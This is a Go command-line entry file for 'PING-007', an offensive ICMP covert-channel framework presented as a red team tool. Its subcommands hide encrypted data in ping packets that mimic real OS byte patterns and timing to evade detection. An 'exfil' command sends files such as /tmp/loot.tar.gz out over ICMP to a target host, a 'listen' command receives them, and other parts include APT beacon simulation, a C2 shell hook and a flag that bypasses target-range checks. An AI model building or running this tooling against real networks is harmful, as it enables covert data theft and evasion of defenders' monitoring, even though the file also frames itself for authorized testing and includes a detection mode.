package main

import (
	"context"
	"fmt"
	mathrand "math/rand"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"ping007/internal/config"
	"ping007/internal/logger"
	"ping007/internal/orchestrator"

	"github.com/spf13/cobra"
)

var (
	version   = "3.0.0"
	buildTime = "unknown"
	commit    = "unknown"
)

// needsRootPrivileges returns true if the given argv requires a raw socket
// (CAP_NET_RAW on Linux / Administrator on Windows). Help, version, completion,
// and the passive/safe variants of status and analyze skip this check.
func needsRootPrivileges(args []string) bool {
	if len(args) < 2 {
		return false
	}

	// --help/-h anywhere in the arg list → cobra just prints help, no socket needed.
	for _, arg := range args[1:] {
		if arg == "--help" || arg == "-h" {
			return false
		}
	}

	command := args[1]

	unprivilegedCommands := map[string]bool{
		"help":       true,
		"--version":  true,
		"version":    true,
		"completion": true,
	}

	if unprivilegedCommands[command] {
		return false
	}

	// status can work in limited mode
	if command == "status" {
		for _, arg := range args {
			if arg == "--no-network" || arg == "--safe" {
				return false
			}
		}
	}

	// analyze --passive reads /proc/net without opening a raw socket
	if command == "analyze" {
		for _, arg := range args {
			if arg == "--passive" || arg == "--safe" {
				return false
			}
		}
	}

	return true
}

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	// Pre-parse os.Args for -c/--config and --allow-all-targets: cobra has
	// not run yet at this point, but the config must be loaded first.
	cfgPath := ""
	allowAll := false
	for i, arg := range os.Args {
		switch {
		case arg == "-c" || arg == "--config":
			if i+1 < len(os.Args) {
				cfgPath = os.Args[i+1]
			}
		case strings.HasPrefix(arg, "--config="):
			cfgPath = strings.TrimPrefix(arg, "--config=")
		case arg == "--allow-all-targets":
			allowAll = true
		}
	}

	cfg, err := config.LoadFrom(cfgPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error loading config: %v\n", err)
		os.Exit(1)
	}
	if allowAll {
		cfg.Network.AllowAllTargets = true
	}

	// Suppress structured logs for informational-only invocations (help, version)
	// and when --no-banner/--quiet is set. Pre-parse os.Args directly since cobra
	// hasn't run yet at this point.
	logLevel := cfg.Framework.LogLevel
	for _, arg := range os.Args {
		switch arg {
		case "--no-banner", "--quiet", "-q",
			"version", "help", "--help", "-h", "--version":
			logLevel = "NONE"
		}
	}

	log := logger.New(logLevel)

	requiresRoot := needsRootPrivileges(os.Args)
	if requiresRoot && os.Geteuid() != 0 {
		fmt.Println("This operation requires root privileges for raw socket operations")
		fmt.Println("Please run with sudo: sudo ping-007")
		os.Exit(1)
	}

	privilegedMode := os.Geteuid() == 0
	orch, err := orchestrator.NewWithPrivileges(cfg, log, privilegedMode)
	if err != nil {
		log.Error("Failed to initialize orchestrator", "error", err)
		os.Exit(1)
	}
	defer orch.Close()

	rootCmd := &cobra.Command{
		Use:   "ping-007",
		Short: "Licensed to Ping: ICMP Stealth Operations",
		Long: `PING-007 is an ICMP covert-channel framework for authorized Red Team operations.

It hides data inside ordinary ping packets by mimicking the exact byte
patterns real operating systems produce — Linux struct timeval timestamps,
Windows "abcdefghijklmnop..." alphabet strings — so intercepted traffic is
indistinguishable from background noise at the payload level.

All commands that open a raw ICMP socket require root / CAP_NET_RAW on Linux
or Administrator on Windows. Exceptions: "version", "status --safe", and
"analyze --passive" run unprivileged.`,
		Version: fmt.Sprintf("%s (build %s, commit %s)", version, buildTime, commit),
	}

	rootCmd.AddCommand(
		createVersionCmd(version, buildTime, commit),
		createStatusCmd(orch),
		createBasicCmd(orch),
		createStealthCmd(orch),
		createAPTCmd(orch),
		createExfilCmd(orch),
		createListenCmd(orch),
		createAnalyzeCmd(orch),
	)
	addShellCommand(rootCmd, orch) // excluded when built with -tags noc2

	// Global flags available to every subcommand.
	rootCmd.PersistentFlags().StringP("config", "c", "", "config file (default: ./config/ping-007.yml)")
	rootCmd.PersistentFlags().Bool("allow-all-targets", false, "skip authorized/forbidden target range validation (labs — use responsibly)")
	rootCmd.PersistentFlags().BoolP("verbose", "v", false, "enable verbose logging")
	rootCmd.PersistentFlags().Bool("no-banner", false, "suppress the startup banner")
	rootCmd.PersistentFlags().StringP("password", "p", "", "shared password for key derivation; sender and receiver must use the same value")

	if err := rootCmd.ExecuteContext(ctx); err != nil {
		// context.Canceled is a normal exit (Ctrl+C / timeout) — not an error
		if err.Error() != "context canceled" {
			log.Error("Command execution failed", "error", err)
			os.Exit(1)
		}
	}
}

func createVersionCmd(ver, buildTime, commit string) *cobra.Command {
	return &cobra.Command{
		Use:   "version",
		Short: "Print version and build information",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Printf("ping-007 v%s (build %s, commit %s)\n", ver, buildTime, commit)
		},
	}
}

func createStatusCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "status",
		Short: "Show framework status and component health",
		Long: `Display the current state of the PING-007 framework: version, session details,
sandbox detection results, network interface info, active crypto algorithm,
and any running operations.

Use --safe or --no-network to skip raw socket operations (no root required).`,
		Example: `  # Full status (requires root)
  ping-007 status

  # Safe status — no network or privileged operations
  ping-007 status --safe`,
		RunE: func(cmd *cobra.Command, args []string) error {
			noNetwork, _ := cmd.Flags().GetBool("no-network")
			safe, _ := cmd.Flags().GetBool("safe")

			options := &orchestrator.StatusOptions{
				SafeMode:  safe || noNetwork,
				NoNetwork: noNetwork || safe,
			}

			return orch.StatusWithOptions(cmd.Context(), options)
		},
	}

	cmd.Flags().Bool("no-network", false, "skip network checks (no root needed)")
	cmd.Flags().Bool("safe", false, "disable all privileged operations")

	return cmd
}

func createBasicCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "basic",
		Short: "Send ICMP echo requests with optional encryption",
		Long: `Send one or more ICMP echo requests to a target, with optional encryption
and OS signature mimicry. Large payloads are automatically fragmented across
multiple 64-byte packets using a 4-byte steganographic header.

Encryption uses AES-256-GCM, ChaCha20-Poly1305, or XOR-CFB-HMAC, selected
randomly per session. Both sender and receiver must share the same --password
for decryption to succeed.`,
		Example: `  # Encrypted message (password shared with receiver)
  ping-007 basic --target 10.0.0.5 --data "recon complete" --password "ops-key"

  # Stealth mode: 64-byte Linux pattern, random 1-5s delay before send
  ping-007 basic --target 10.0.0.5 --data "ping" --stealth --human-timing --password "ops-key"

  # Paranoid: 3 clean pings before and after the data packet
  ping-007 basic --target 10.0.0.5 --data "msg" --decoy-pings 3 --after-pings 3 --password "ops-key"

  # Raw ICMP without signature — useful for custom payloads
  ping-007 basic --target 10.0.0.5 --data "test" --no-signature --no-encrypt`,
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			data, _ := cmd.Flags().GetString("data")
			interactive, _ := cmd.Flags().GetBool("interactive")
			stealth, _ := cmd.Flags().GetBool("stealth")
			signature, _ := cmd.Flags().GetString("signature")
			noSignature, _ := cmd.Flags().GetBool("no-signature")
			delay, _ := cmd.Flags().GetDuration("delay")
			humanTiming, _ := cmd.Flags().GetBool("human-timing")
			ultraStealth, _ := cmd.Flags().GetBool("ultra-stealth")
			decoyPings, _ := cmd.Flags().GetInt("decoy-pings")
			afterPings, _ := cmd.Flags().GetInt("after-pings")
			pingInterval, _ := cmd.Flags().GetDuration("ping-interval")
			noEncrypt, _ := cmd.Flags().GetBool("no-encrypt")
			encodeOnly, _ := cmd.Flags().GetBool("encode")
			password, _ := cmd.Flags().GetString("password")

			if noSignature || signature == "none" {
				signature = "none"
				stealth = false
			}

			if ultraStealth {
				stealth = true
				humanTiming = true
				if signature == "none" {
					signature = "linux"
				}
			}

			if delay > 0 {
				fmt.Printf("Applying transmission delay: %v\n", delay)
				time.Sleep(delay)
			} else if humanTiming {
				humanDelay := time.Duration(mathrand.Intn(4000)+1000) * time.Millisecond
				fmt.Printf("Human timing simulation: %v\n", humanDelay)
				time.Sleep(humanDelay)
			}

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			} else {
				fmt.Printf("Warning: No password - using random keys (non-interoperable)\n")
			}

			return orch.Basic(cmd.Context(), &orchestrator.BasicOptions{
				Target:       target,
				Data:         data,
				Interactive:  interactive,
				Stealth:      stealth,
				Signature:    signature,
				DecoyPings:   decoyPings,
				AfterPings:   afterPings,
				PingInterval: pingInterval,
				NoEncrypt:    noEncrypt,
				EncodeOnly:   encodeOnly,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address")
	cmd.Flags().StringP("data", "d", "", "plaintext message to transmit")
	cmd.Flags().BoolP("interactive", "i", false, "read messages from stdin interactively")
	cmd.Flags().BoolP("stealth", "s", false, "mimic OS ping: 64-byte payload with correct platform byte patterns")
	cmd.Flags().String("signature", "linux", "platform signature embedded in payload (linux, windows, none)")
	cmd.Flags().Bool("no-signature", false, "send raw ICMP without OS byte pattern (higher payload entropy)")
	cmd.Flags().Duration("delay", 0, "fixed delay before sending (e.g. 2s, 500ms)")
	cmd.Flags().Bool("human-timing", false, "random 1-5s pre-send delay to simulate human interaction")
	cmd.Flags().Bool("ultra-stealth", false, "combine stealth + human-timing + OS signature (maximum evasion)")
	cmd.Flags().Int("decoy-pings", 0, "send N clean pings before the data packet")
	cmd.Flags().Int("after-pings", 0, "send N clean pings after the data packet")
	cmd.Flags().Duration("ping-interval", time.Second, "interval between packets in a sequence (1s matches real ping default)")
	cmd.Flags().Bool("no-encrypt", false, "disable encryption and send raw plaintext")
	cmd.Flags().Bool("encode", false, "base64-encode without encrypting (no authentication, lower entropy than AES)")
	cmd.MarkFlagRequired("target")

	return cmd
}

func createStealthCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "stealth",
		Short: "Stealth transmission with adaptive timing and evasion",
		Long: `Transmit data with the full evasion stack: sandbox detection, adaptive
delays based on configured timing profiles, payload obfuscation, OS signature
mimicry, and automatic fragmentation.

Encryption uses AES-256-GCM with context binding — the AEAD authentication
tag covers the target IP, session ID, and sequence number, so replayed or
tampered packets are rejected.`,
		Example: `  # Stealth send with shared password
  ping-007 stealth --target 10.0.0.5 --data "exfil ready" --password "ops-key"`,
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			data, _ := cmd.Flags().GetString("data")
			password, _ := cmd.Flags().GetString("password")

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Stealth(cmd.Context(), &orchestrator.StealthOptions{
				Target: target,
				Data:   data,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address")
	cmd.Flags().StringP("data", "d", "", "plaintext message to transmit")
	cmd.MarkFlagRequired("target")

	return cmd
}

func createAPTCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "apt",
		Short: "Simulate APT group ICMP beacon patterns",
		Long: `Emit ICMP traffic with timing and packet-size characteristics matching a
specific APT group profile. Useful for testing whether your detection stack
can distinguish nation-state beacon cadence from background ping traffic.

Available profiles and their default beacon intervals:
  lazarus   — Lazarus Group (DPRK),  5 min – 1 h
  apt29     — Cozy Bear (RU),        30 min – 2 h
  apt28     — Fancy Bear (RU),       10 min – 30 min
  equation  — Equation Group (NSA),  1 day – 3 days`,
		Example: `  # Simulate Lazarus Group beaconing for 5 minutes
  ping-007 apt --target 10.0.0.5 --profile lazarus --duration 300

  # Equation Group ultra-slow pattern (runs for 10 minutes, one beacon at most)
  ping-007 apt --target 10.0.0.5 --profile equation --duration 600`,
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			profile, _ := cmd.Flags().GetString("profile")
			duration, _ := cmd.Flags().GetInt("duration")
			password, _ := cmd.Flags().GetString("password")

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.APT(cmd.Context(), &orchestrator.APTOptions{
				Target:   target,
				Profile:  profile,
				Duration: duration,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address")
	cmd.Flags().StringP("profile", "r", "", "APT group profile: lazarus, apt29, apt28, or equation")
	cmd.Flags().Int("duration", 60, "simulation duration in seconds")
	cmd.MarkFlagRequired("target")
	cmd.MarkFlagRequired("profile")

	return cmd
}

func createExfilCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "exfil",
		Short: "Exfiltrate a file over ICMP",
		Long: `Split a file into chunks and transmit each chunk inside ICMP echo requests.

Methods:
  icmp_tunnel   — steganographic embedding in OS ping patterns (default; hardest
                  to detect because payloads match real OS output byte-for-byte)
  icmp_payload  — direct ICMP payload with a small header (simpler, slightly louder)

Modes:
  stealth  — timing delays between chunks (default)
  fast     — no delays; maximizes throughput
  covert   — maximum fragmentation + padding

The receiver must run "listen" with the same --password to reassemble and decrypt.`,
		Example: `  # Exfiltrate a file using the steganographic tunnel method
  ping-007 exfil --target 10.0.0.5 --file /tmp/loot.tar.gz --password "ops-key"

  # Fast mode with Windows TTL signature (128 instead of 64)
  ping-007 exfil --target 10.0.0.5 --file data.bin --mode fast --signature windows --password "ops-key"`,
		RunE: func(cmd *cobra.Command, args []string) error {
			target, _ := cmd.Flags().GetString("target")
			file, _ := cmd.Flags().GetString("file")
			method, _ := cmd.Flags().GetString("method")
			mode, _ := cmd.Flags().GetString("mode")
			chunkSize, _ := cmd.Flags().GetInt("chunk-size")
			noStealth, _ := cmd.Flags().GetBool("no-stealth")
			noEncrypt, _ := cmd.Flags().GetBool("no-encrypt")
			signature, _ := cmd.Flags().GetString("signature")
			password, _ := cmd.Flags().GetString("password")

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Exfiltrate(cmd.Context(), &orchestrator.ExfilOptions{
				Target:    target,
				File:      file,
				Method:    method,
				Mode:      mode,
				ChunkSize: chunkSize,
				Stealth:   !noStealth,
				Encrypt:   !noEncrypt,
				Signature: signature,
			})
		},
	}

	cmd.Flags().StringP("target", "t", "", "target IP address")
	cmd.Flags().StringP("file", "f", "", "path to file to exfiltrate")
	cmd.Flags().String("method", "icmp_tunnel", "exfiltration method: icmp_tunnel or icmp_payload")
	cmd.Flags().String("mode", "stealth", "operation mode: stealth (timing delays), fast (no delays), or covert (max fragmentation)")
	cmd.Flags().Int("chunk-size", 512, "bytes per chunk before fragmentation")
	cmd.Flags().Bool("no-stealth", false, "skip stealth techniques (faster but noisier)")
	cmd.Flags().Bool("no-encrypt", false, "transmit plaintext without encryption")
	cmd.Flags().String("signature", "linux", "OS signature for TTL and payload pattern (linux, windows, none)")
	cmd.MarkFlagRequired("target")
	cmd.MarkFlagRequired("file")

	return cmd
}

func createListenCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "listen",
		Short: "Receive ICMP data and reassemble packets",
		Long: `Open a raw ICMP socket on the specified interface and extract hidden data from
incoming ping packets. Automatically reassembles fragmented messages using the
4-byte steganographic fragment header and decrypts with the shared password.

Received data is written to --output as timestamped files. Use --quiet to
suppress per-packet log lines during live operations.`,
		Example: `  # Listen on the default interface, decrypt with shared password
  ping-007 listen --password "ops-key"

  # Listen on a specific interface with a 5-minute timeout, quiet mode
  ping-007 listen --interface ens3 --timeout 300 --password "ops-key" --quiet`,
		RunE: func(cmd *cobra.Command, args []string) error {
			iface, _ := cmd.Flags().GetString("interface")
			output, _ := cmd.Flags().GetString("output")
			method, _ := cmd.Flags().GetString("method")
			timeout, _ := cmd.Flags().GetInt("timeout")
			quiet, _ := cmd.Flags().GetBool("quiet")
			password, _ := cmd.Flags().GetString("password")

			if password != "" {
				if err := orch.SetPassword(password); err != nil {
					return fmt.Errorf("failed to set password: %w", err)
				}
			}

			return orch.Listen(cmd.Context(), &orchestrator.ListenOptions{
				Interface: iface,
				Output:    output,
				Method:    method,
				Timeout:   timeout,
				Quiet:     quiet,
			})
		},
	}

	cmd.Flags().String("interface", "eth0", "network interface to listen on")
	cmd.Flags().StringP("output", "o", "./received", "directory for received data files")
	cmd.Flags().String("method", "icmp_tunnel", "listen method: icmp_tunnel or icmp_payload")
	cmd.Flags().Int("timeout", 60, "stop listening after N seconds (0 = no timeout)")
	cmd.Flags().BoolP("quiet", "q", false, "suppress per-packet log lines")

	return cmd
}

func createAnalyzeCmd(orch *orchestrator.Orchestrator) *cobra.Command {
	cmd := &cobra.Command{
		Use:   "analyze",
		Short: "Analyze network traffic for hidden ICMP channels",
		Long: `Capture ICMP packets and check for anomalies: non-standard payload patterns,
high entropy (suggesting encryption or compression), unusual sequence number
distributions, or PING-007 fragmentation headers (0xA7 magic byte).

Use --passive to analyze /proc/net without opening a raw socket (no root
required, but detection is limited to connection-level metadata).`,
		Example: `  # Active analysis for 2 minutes (requires root)
  ping-007 analyze --duration 120

  # Passive analysis without root privileges
  ping-007 analyze --passive --duration 60`,
		RunE: func(cmd *cobra.Command, args []string) error {
			duration, _ := cmd.Flags().GetInt("duration")
			passive, _ := cmd.Flags().GetBool("passive")

			return orch.Analyze(cmd.Context(), &orchestrator.AnalyzeOptions{
				Duration: duration,
				Passive:  passive,
			})
		},
	}

	cmd.Flags().Int("duration", 60, "capture window in seconds")
	cmd.Flags().Bool("passive", false, "read /proc/net instead of raw socket (no root needed, limited detection)")

	return cmd
}
